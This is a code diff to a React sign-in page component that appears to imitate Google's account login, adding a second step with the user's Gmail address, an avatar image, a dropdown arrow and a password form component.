@@ -12,17 +12,23 @@ import {
   ViewContainerContent,
   ViewContainerPresentation,
   ViewContainerPresentation__Header,
-  ViewContainerPresentation__HeaderContent,
   FormContainer,
   FormContent,
   FooterContainer__footer,
   FooterContainer__footerContent,
   FooterContainer__footerContentUL,
 } from "../../styles/SigninStyle";
+import {
+  Container__rowDown,
+  ProfileIdentifier,
+  UserContainer__Image,
+  UserContainer__ImageContainer,
+  UserContainer__ImageContent,
+  User__Container,
+} from "./styles/SigninSecondPageStyle";
+import SigninSecondForm from "./form/SigninSecondForm";
 
-import SigninForm from "../first/form/SigninForm";
-
-export default function SigninSecondPage({ name }) {
+export default function SigninSecondPage({ gmail, name, closeSecondPage }) {
   return (
     <>
       <Container>
@@ -89,14 +95,35 @@ export default function SigninSecondPage({ name }) {
                         <h1>
                           <span>Hi {name}</span>
                         </h1>
-                        {/* here */}
+                        <div style={{ height: "32px", marginTop: "8px" }}>
+                          <User__Container onClick={closeSecondPage}>
+                            <UserContainer__ImageContainer>
+                              <UserContainer__ImageContent>
+                                <UserContainer__Image src="https://lh3.googleusercontent.com/-CfjDY52G0gE/AAAAAAAAAAI/AAAAAAAAAAA/AMZuuclr8_aOMTBXFpXtw7u09oVyuMlL1w/s128-c/photo.jpg"></UserContainer__Image>
+                              </UserContainer__ImageContent>
+                            </UserContainer__ImageContainer>
+                            <ProfileIdentifier>{gmail}</ProfileIdentifier>
+                            <Container__rowDown>
+                              <svg
+                                aria-hidden="true"
+                                fill="currentColor"
+                                focusable="false"
+                                viewBox="0 0 24 24"
+                                xmlns="https://www.w3.org/2000/svg"
+                              >
+                                <polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon>
+                              </svg>
+                            </Container__rowDown>
+                          </User__Container>
+                        </div>
                       </ViewContainerPresentation__Header>
                     </div>
                     <FormContainer role="presentation">
                       <FormContent role="presentation">
                         <div>
                           <div>
-                            <SigninForm />
+                            <SigninSecondForm />
+                            {/* Enter your password */}
                           </div>
                         </div>
                       </FormContent>
